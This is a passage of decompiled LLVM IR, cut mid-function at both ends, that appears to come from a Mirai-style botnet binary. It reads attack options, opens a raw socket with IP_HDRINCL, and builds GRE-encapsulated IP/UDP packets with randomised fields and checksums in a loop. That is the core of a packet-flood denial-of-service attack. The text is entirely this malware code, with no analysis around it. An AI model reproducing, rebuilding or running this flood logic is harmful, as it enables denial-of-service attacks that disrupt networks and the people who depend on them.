  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9ac4, i32* %fp.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v4_9adc = inttoptr i32 %v0_9ac8 to i32*
  %v5_9adc = call i32 @attack_get_opt_int(i32 %v0_9ad8, i32* %v4_9adc, i32 4, i32 64)
  %v1_9ae4 = urem i32 %v5_9adc, 256
  store i32 %v1_9ae4, i32* %ip.global-to-local, align 4
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9af4 = load i32, i32* @r4, align 4
  %v6_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v7_9afc = call i32 @attack_get_opt_int(i32 %v0_9af4, i32* %v6_9afc, i32 5, i32 1)
  %v1_9b08 = urem i32 %v7_9afc, 256
  store i32 %v1_9b08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r5, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  %v5_9b20 = inttoptr i32 %v0_9b14 to i32*
  %v6_9b20 = call i32 @attack_get_opt_int(i32 %v0_9b18, i32* %v5_9b20, i32 6, i32 65535)
  %v0_9b28 = load i32, i32* @r5, align 4
  store i32 %v0_9b28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9b20, i32* @r8, align 4
  %v0_9b38 = load i32, i32* @r4, align 4
  %v4_9b3c = inttoptr i32 %v0_9b28 to i32*
  %v5_9b3c = call i32 @attack_get_opt_int(i32 %v0_9b38, i32* %v4_9b3c, i32 7, i32 65535)
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9b3c, i32* @r7, align 4
  %v0_9b50 = load i32, i32* @r4, align 4
  %v4_9b54 = inttoptr i32 %v0_9b40 to i32*
  %v5_9b54 = call i32 @attack_get_opt_int(i32 %v0_9b50, i32* %v4_9b54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r5, align 4
  store i32 %v0_9b64, i32* %r1.global-to-local, align 4
  %v0_9b68 = load i32, i32* @r4, align 4
  %v4_9b6c = inttoptr i32 %v0_9b64 to i32*
  %v5_9b6c = call i32 @attack_get_opt_int(i32 %v0_9b68, i32* %v4_9b6c, i32 1, i32 1)
  %v1_9b74 = urem i32 %v5_9b6c, 256
  store i32 %v1_9b74, i32* %ip.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b84 = load i32, i32* @r4, align 4
  %v5_9b8c = inttoptr i32 %v0_9b78 to i32*
  %v6_9b8c = call i32 @attack_get_opt_int(i32 %v0_9b84, i32* %v5_9b8c, i32 19, i32 0)
  %v0_9b94 = load i32, i32* @r5, align 4
  store i32 %v0_9b94, i32* %r1.global-to-local, align 4
  %v2_9b98 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_9b98, i32* %r3.global-to-local, align 4
  store i32 %v6_9b8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ba4 = load i32, i32* @r4, align 4
  %v4_9ba8 = inttoptr i32 %v0_9b94 to i32*
  %v5_9ba8 = call i32 @attack_get_opt_int(i32 %v0_9ba4, i32* %v4_9ba8, i32 25, i32 %v2_9b98)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9bbc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9bc0 = icmp eq i32 %v3_9bbc, -1
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bc0, label %dec_label_pc_a060, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9bd4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9bd4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9be8 = call i32 @__GI_setsockopt(i32 %v3_9bbc, i32 0, i32 3, i32 %v6_9bd4, i32 4)
  %v7_9bec = icmp eq i32 %v5_9be8, -1
  store i1 %v7_9bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bec, label %dec_label_pc_a058, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bcc
  %v0_9bf4 = load i32, i32* @r8, align 4
  %v0_9bf8 = load i32, i32* @r7, align 4
  %v0_9bfc = load i32, i32* %fp.global-to-local, align 4
  %v0_9c00 = load i32, i32* @r6, align 4
  %v1_9c00 = urem i32 %v0_9c00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9c08 = urem i32 %v0_9bf4, 65536
  store i32 %v3_9c08, i32* %r3.global-to-local, align 4
  %v3_9c0c = urem i32 %v0_9bf8, 65536
  store i32 %v3_9c0c, i32* %r4.global-to-local, align 4
  %v0_9c10 = load i32, i32* @sl, align 4
  %v2_9c10 = icmp eq i32 %v0_9c10, 0
  store i1 %v2_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9c28 = urem i32 %v0_9bfc, 65536
  store i32 %v3_9c28, i32* @fp, align 4
  br i1 %v2_9c10, label %dec_label_pc_a06c, label %dec_label_pc_9c38

dec_label_pc_9c38:                                ; preds = %dec_label_pc_9bf4
  %v3_9bf8 = mul i32 %v0_9bf8, 65536
  %v3_9bf4 = mul i32 %v0_9bf4, 65536
  %v0_9bfc.not = or i32 %v0_9bfc, -65536
  %v1_9c3c = xor i32 %v0_9bfc.not, 65535
  %v3_9c40 = mul i32 %v5_9b54, 65536
  %v1_9c44 = add i32 %v3_9c40, 3407872
  %tmp67 = udiv i32 %v1_9c44, 256
  %v3_9c58 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9c3c, 256
  %v3_9c5c = and i32 %tmp68, 65280
  store i32 %v3_9c5c, i32* %ip.global-to-local, align 4
  %v1_9c60 = add i32 %v3_9c40, 524288
  %v1_9c68 = add i32 %v3_9c40, 1835008
  %tmp69 = udiv i32 %v1_9c3c, 256
  %v4_9c6c = urem i32 %tmp69, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c5c
  %v4_9c74 = udiv i32 %v1_9c44, 16777216
  %v5_9c74 = or i32 %v3_9c58, %v4_9c74
  store i32 %v5_9c74, i32* @r8, align 4
  %v3_9c80 = udiv i32 %v1_9c68, 256
  %tmp70 = mul i32 %v0_9bfc, 256
  %v3_9c84 = and i32 %tmp70, 65280
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bfc, 256
  %v4_9c94 = urem i32 %tmp71, 256
  %v5_9c94 = or i32 %v4_9c94, %v3_9c84
  %tmp72 = mul i32 %v0_9bf4, 256
  %v3_9c98 = and i32 %tmp72, 65280
  %v1_9c9c = and i32 %v3_9c80, 65280
  store i32 %v1_9c9c, i32* @r6, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bf8, 256
  %v3_9ca8 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bf4, 256
  %v4_9cac = urem i32 %tmp74, 256
  %v5_9cac = or i32 %v4_9cac, %v3_9c98
  store i32 %v5_9cac, i32* @lr, align 4
  %v4_9cb0 = udiv i32 %v1_9c68, 16777216
  %v5_9cb0 = or i32 %v1_9c9c, %v4_9cb0
  store i32 %v5_9cb0, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bf8, 256
  %v4_9cb4 = urem i32 %tmp75, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9ca8
  %tmp76 = udiv i32 %v1_9c60, 256
  %v3_9cb8 = and i32 %tmp76, 65280
  store i32 %v3_9cb8, i32* @r5, align 4
  %v4_9ccc = udiv i32 %v1_9c60, 16777216
  %v5_9ccc = or i32 %v3_9cb8, %v4_9ccc
  store i32 %v5_9ccc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9d20 = sext i8 %v5_9ac0 to i32
  %sext12 = mul nuw i32 %v5_9c94, 65536
  %v4_9d3813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9cb0, 65536
  %v4_9d9c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c6c, 65536
  %v4_9da0 = sdiv i32 %sext9, 65536
  %v1_9da8 = trunc i32 %v4_9d9c to i16
  %v2_9dd0 = icmp eq i32 %v1_9c00, 0
  %sext10 = mul nuw i32 %v5_9cac, 65536
  %v4_9df0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9cb4, 65536
  %v4_9df8 = sdiv i32 %sext11, 65536
  %v1_9d30 = trunc i32 %v5_9adc to i8
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %bb82, %dec_label_pc_9c38
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ce0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_9a88, i32* %r2.global-to-local, align 4
  %v3_9ce8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ce8, i32* %r3.global-to-local, align 4
  %v2_9cec = load i32, i32* @r4, align 4
  %v5_9cec = mul i32 %v2_9cec, 4
  %v6_9cec = add i32 %v5_9cec, %v2_9a88
  %v7_9cec = inttoptr i32 %v6_9cec to i32*
  store i32 %v2_9ce0, i32* %v7_9cec, align 4
  %v0_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cf0 = mul i32 %v1_9cf0, 4
  %v5_9cf0 = add i32 %v4_9cf0, %v0_9cf0
  %v6_9cf0 = inttoptr i32 %v5_9cf0 to i32*
  %v7_9cf0 = load i32, i32* %v6_9cf0, align 4
  store i32 %v7_9cf0, i32* %r4.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v7_9cf0 to i8*
  %v2_9cf4 = load i8, i8* %v1_9cf4, align 1
  %tmp = urem i8 %v2_9cf4, 16
  %v1_9cf8 = zext i8 %tmp to i32
  %v1_9cfc = or i32 %v1_9cf8, 64
  store i32 %v1_9cfc, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v1_9cfc to i8
  store i8 %v1_9d00, i8* %v1_9cf4, align 1
  %v0_9d04 = load i32, i32* %r3.global-to-local, align 4
  %v5_9d08 = mul i32 %v0_9d04, 24
  store i32 %v5_9d08, i32* %r1.global-to-local, align 4
  %v0_9d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d0c = inttoptr i32 %v0_9d0c to i8*
  %v2_9d0c = load i8, i8* %v1_9d0c, align 1
  %v1_9d10 = and i8 %v2_9d0c, -16
  %v1_9d14 = or i8 %v1_9d10, 5
  store i32 %v1_9b08, i32* %r5.global-to-local, align 4
  store i8 %v1_9d14, i8* %v1_9d0c, align 1
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d24 = add i32 %v2_9d24, 1
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v5_9ac0, i8* %v4_9d24, align 1
  store i32 %v1_9ae4, i32* %r3.global-to-local, align 4
  %v0_9d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_9d2c = icmp eq i32 %v0_9d2c, 0
  store i1 %v2_9d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_9d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d30 = add i32 %v2_9d30, 8
  %v4_9d30 = inttoptr i32 %v3_9d30 to i8*
  store i8 %v1_9d30, i8* %v4_9d30, align 1
  %v0_9d34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d34, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9cd4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9cd4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  %v3_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_9d3c = add i32 %v3_9d3c, 6
  %v5_9d3c = inttoptr i32 %v4_9d3c to i16*
  store i16 64, i16* %v5_9d3c, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d44 = add i32 %v2_9d44, 9
  %v4_9d44 = inttoptr i32 %v3_9d44 to i8*
  store i8 47, i8* %v4_9d44, align 1
  %v0_9d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d48 = add i32 %v0_9d48, 20
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d50 = trunc i32 %v0_9d50 to i16
  %v3_9d50 = add i32 %v0_9d48, 4
  %v4_9d50 = inttoptr i32 %v3_9d50 to i16*
  store i16 %v1_9d50, i16* %v4_9d50, align 2
  %v0_9d54 = load i32, i32* @r8, align 4
  %v1_9d54 = trunc i32 %v0_9d54 to i16
  %v2_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d54 = add i32 %v2_9d54, 2
  %v4_9d54 = inttoptr i32 %v3_9d54 to i16*
  store i16 %v1_9d54, i16* %v4_9d54, align 2
  %v0_9d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d58 = trunc i32 %v0_9d58 to i16
  %v2_9d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d58 = add i32 %v2_9d58, 2
  %v4_9d58 = inttoptr i32 %v3_9d58 to i16*
  store i16 %v1_9d58, i16* %v4_9d58, align 2
  store i32 %v5_9ba8, i32* %r3.global-to-local, align 4
  %v0_9d60 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = add i32 %v0_9d60, 24
  %v2_9d60 = inttoptr i32 %v1_9d60 to i8*
  %v3_9d60 = load i8, i8* %v2_9d60, align 1
  %v4_9d60 = zext i8 %v3_9d60 to i32
  store i32 %v4_9d60, i32* %r2.global-to-local, align 4
  %v2_9d64 = add i32 %v0_9d60, 12
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v5_9ba8, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d68 = and i32 %v0_9d68, -241
  %v1_9d6c = or i32 %v1_9d68, 64
  store i32 %v1_9d6c, i32* %r2.global-to-local, align 4
  %v0_9d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d70 = load i32, i32* @sb, align 4
  %v2_9d70 = add i32 %v1_9d70, %v0_9d70
  store i32 %v2_9d70, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v2_9d70, 16
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v1_9d6c to i8
  %v2_9d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d78 = add i32 %v2_9d78, 24
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d7c = add i32 %v0_9d7c, 24
  %v2_9d7c = inttoptr i32 %v1_9d7c to i8*
  %v3_9d7c = load i8, i8* %v2_9d7c, align 1
  %v1_9d80 = and i8 %v3_9d7c, -16
  %v1_9d84 = or i8 %v1_9d80, 5
  store i8 %v1_9d84, i8* %v2_9d7c, align 1
  %v0_9d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v1_9d8c, 16
  %v3_9d8c = inttoptr i32 %v2_9d8c to i32*
  store i32 %v0_9d8c, i32* %v3_9d8c, align 4
  %v0_9d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d94, 24
  store i32 %v1_9d94, i32* @r5, align 4
  %v3_9d98 = add i32 %v0_9d94, 25
  %v4_9d98 = inttoptr i32 %v3_9d98 to i8*
  store i8 %v5_9ac0, i8* %v4_9d98, align 1
  store i32 %v4_9d9c, i32* %r2.global-to-local, align 4
  store i32 %v4_9da0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ae4, i32* %r1.global-to-local, align 4
  %v2_9da8 = load i32, i32* @r5, align 4
  %v3_9da8 = add i32 %v2_9da8, 2
  %v4_9da8 = inttoptr i32 %v3_9da8 to i16*
  store i16 %v1_9da8, i16* %v4_9da8, align 2
  %v0_9dac = load i32, i32* %r3.global-to-local, align 4
  %v1_9dac = trunc i32 %v0_9dac to i16
  %v2_9dac = load i32, i32* @r5, align 4
  %v3_9dac = add i32 %v2_9dac, 4
  %v4_9dac = inttoptr i32 %v3_9dac to i16*
  store i16 %v1_9dac, i16* %v4_9dac, align 2
  %v0_9db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9db0, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9db8 = trunc i32 %v0_9db8 to i8
  %v2_9db8 = load i32, i32* @r5, align 4
  %v3_9db8 = add i32 %v2_9db8, 8
  %v4_9db8 = inttoptr i32 %v3_9db8 to i8*
  store i8 %v1_9db8, i8* %v4_9db8, align 1
  %v0_9dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dbc, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_9dbc = trunc i32 %v1_9dbc to i16
  %v3_9dbc = load i32, i32* @r5, align 4
  %v4_9dbc = add i32 %v3_9dbc, 6
  %v5_9dbc = inttoptr i32 %v4_9dbc to i16*
  store i16 %v2_9dbc, i16* %v5_9dbc, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i8
  %v2_9dc0 = load i32, i32* @r5, align 4
  %v3_9dc0 = add i32 %v2_9dc0, 9
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  %v0_9dc4 = call i32 @rand_next()
  store i32 %v1_9c00, i32* %r1.global-to-local, align 4
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd4 = sub i32 1023, %v0_9dc4
  store i32 %v1_9dd4, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9ddc = load i32, i32* @r5, align 4
  %v3_9ddc = add i32 %v2_9ddc, 16
  %v4_9ddc = inttoptr i32 %v3_9ddc to i32*
  store i32 %v1_9dd4, i32* %v4_9ddc, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_9dd8 = add i32 %v1_9dd8, 16
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i32*
  %v4_9dd8 = load i32, i32* %v3_9dd8, align 4
  store i32 %v4_9dd8, i32* %r3.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r5, align 4
  %v3_9de0 = add i32 %v2_9de0, 16
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 %v4_9dd8, i32* %v4_9de0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9de4 = load i32, i32* @r5, align 4
  %v2_9de4 = add i32 %v1_9de4, 12
  %v3_9de4 = inttoptr i32 %v2_9de4 to i32*
  store i32 %v0_9dc4, i32* %v3_9de4, align 4
  %v3_9de8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dec = load i32, i32* %r4.global-to-local, align 4
  %v1_9dec = add i32 %v0_9dec, 44
  store i32 %v1_9dec, i32* @r6, align 4
  store i32 %v4_9df0, i32* %r2.global-to-local, align 4
  %v1_9df4 = add i32 %v3_9de8, 1
  store i32 %v1_9df4, i32* @r4, align 4
  store i32 %v4_9df8, i32* %r3.global-to-local, align 4
  %v1_9dfc = load i32, i32* @sl, align 4
  %v9_9dfc = icmp eq i32 %v1_9df4, %v1_9dfc
  store i1 %v9_9dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_9e00 = load i32, i32* @r7, align 4
  %v1_9e00 = trunc i32 %v0_9e00 to i16
  %v3_9e00 = add i32 %v0_9dec, 48
  %v4_9e00 = inttoptr i32 %v3_9e00 to i16*
  store i16 %v1_9e00, i16* %v4_9e00, align 2
  %v0_9e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e04 = trunc i32 %v0_9e04 to i16
  %v2_9e04 = load i32, i32* @r6, align 4
  %v3_9e04 = inttoptr i32 %v2_9e04 to i16*
  store i16 %v1_9e04, i16* %v3_9e04, align 2
  %v0_9e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e08 = trunc i32 %v0_9e08 to i16
  %v2_9e08 = load i32, i32* @r6, align 4
  %v3_9e08 = add i32 %v2_9e08, 2
  %v4_9e08 = inttoptr i32 %v3_9e08 to i16*
  store i16 %v1_9e08, i16* %v4_9e08, align 2
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* %stack_var_-44, align 4
  %v5_9e10 = icmp slt i32 %v1_9df4, %v1_9dfc
  br i1 %v5_9e10, label %dec_label_pc_9cd4, label %dec_label_pc_9e14

dec_label_pc_9e14:                                ; preds = %bb82
  store i32 %v5_9b54, i32* %r5.global-to-local, align 4
  %v1_9e1c = add i32 %v5_9b54, 8
  store i32 %v1_9e1c, i32* %r4.global-to-local, align 4
  %v0_9e2c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9e28.preheader

dec_label_pc_9e28.preheader:                      ; preds = %dec_label_pc_9e14, %dec_label_pc_a06c
  %v0_9e2c.pre = phi i32 [ %v0_9e2c.pre.pre, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_a06c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9e1c, %dec_label_pc_9e14 ], [ %v1_a074, %dec_label_pc_a06c ]
  %storemerge = add i32 %v5_9b54, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_a020 = icmp eq i32 %v1_9c00, 0
  %v2_a03c = icmp eq i32 %v1_9b74, 0
  %v2_9e68 = icmp eq i32 %v5_9ba8, -1
  %v7_9e68 = icmp eq i32 %v5_9ba8, -1
  br label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9eb8, %dec_label_pc_9e28.preheader
  %v0_9e2c = phi i32 [ %v0_9e2c.pre, %dec_label_pc_9e28.preheader ], [ 0, %dec_label_pc_9e28 ], [ %v1_9f54, %dec_label_pc_9eb8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9e2c = icmp eq i32 %v0_9e2c, 0
  store i1 %v2_9e2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9e2c, label %dec_label_pc_9e28, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e28
  br label %dec_label_pc_9e3c

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9e38
  %v1_9e50 = phi i32 [ %v1_9f50, %dec_label_pc_9eb8 ], [ 0, %dec_label_pc_9e38 ]
  %v5_9e40 = mul i32 %v1_9e50, 24
  %v1_9e44 = load i32, i32* @sb, align 4
  %v2_9e44 = add i32 %v1_9e44, %v5_9e40
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 %v2_9a88, i32* %r4.global-to-local, align 4
  %v1_9e4c = add i32 %v2_9e44, 20
  %v2_9e4c = inttoptr i32 %v1_9e4c to i8*
  %v3_9e4c = load i8, i8* %v2_9e4c, align 1
  %v4_9e4c = zext i8 %v3_9e4c to i32
  store i32 %v4_9e4c, i32* %r2.global-to-local, align 4
  %v4_9e50 = mul i32 %v1_9e50, 4
  %v5_9e50 = add i32 %v4_9e50, %v2_9a88
  %v6_9e50 = inttoptr i32 %v5_9e50 to i32*
  %v7_9e50 = load i32, i32* %v6_9e50, align 4
  store i32 %v7_9e50, i32* @r5, align 4
  %v7_9e54 = icmp eq i8 %v3_9e4c, 31
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v7_9e50, 24
  store i32 %v1_9e58, i32* @r6, align 4
  %v1_9e5c = add i32 %v7_9e50, 44
  store i32 %v1_9e5c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e4c, 32
  br i1 %tmp86, label %dec_label_pc_9f64, label %dec_label_pc_9e64

dec_label_pc_9e64:                                ; preds = %dec_label_pc_9e3c
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e78 = load i32, i32* @fp, align 4
  %v9_9e78 = icmp eq i32 %v0_9e78, 65535
  store i1 %v9_9e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e78, label %dec_label_pc_9fdc, label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge, %dec_label_pc_9e70
  %v1_9e84 = phi i32 [ %v1_9e84.pre, %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge ], [ 65535, %dec_label_pc_9e70 ]
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v9_9e84 = icmp eq i32 %v3_9c08, %v1_9e84
  store i1 %v9_9e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e84, label %dec_label_pc_a004, label %dec_label_pc_9e8c

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge, %dec_label_pc_9e80
  %v1_9e90 = phi i32 [ %v1_9e90.pre, %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge ], [ %v1_9e84, %dec_label_pc_9e80 ]
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v9_9e90 = icmp eq i32 %v3_9c0c, %v1_9e90
  store i1 %v9_9e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e90, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_9e98:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %dec_label_pc_a034, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_9e98
  %v1_9ea0 = load i32, i32* @r5, align 4
  %v2_9ea0 = add i32 %v1_9ea0, 16
  %v3_9ea0 = inttoptr i32 %v2_9ea0 to i32*
  %v4_9ea0 = load i32, i32* %v3_9ea0, align 4
  store i32 %v4_9ea0, i32* %r3.global-to-local, align 4
  %v2_9ea4 = load i32, i32* @r6, align 4
  %v3_9ea4 = add i32 %v2_9ea4, 16
  %v4_9ea4 = inttoptr i32 %v3_9ea4 to i32*
  store i32 %v4_9ea0, i32* %v4_9ea4, align 4
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_9eb8:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034, %dec_label_pc_a048
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9ebc = load i32, i32* @r5, align 4
  %v3_9ebc = add i32 %v2_9ebc, 10
  %v4_9ebc = inttoptr i32 %v3_9ebc to i16*
  store i16 0, i16* %v4_9ebc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  store i32 %v0_9ec4, i32* @r0, align 4
  %v2_9ec8 = call i32 @checksum_generic(i32 %v0_9ec4, i32 20)
  %v3_9ec8 = trunc i32 %v2_9ec8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ed0 = load i32, i32* @r5, align 4
  %v4_9ed0 = add i32 %v3_9ed0, 10
  %v5_9ed0 = inttoptr i32 %v4_9ed0 to i16*
